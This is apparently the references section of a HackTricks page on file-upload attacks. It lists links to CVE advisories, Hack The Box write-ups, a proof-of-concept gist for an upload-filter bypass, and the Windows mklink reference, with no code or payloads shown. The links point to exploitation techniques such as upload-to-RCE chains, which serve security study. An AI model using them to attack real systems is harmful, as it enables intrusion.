- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
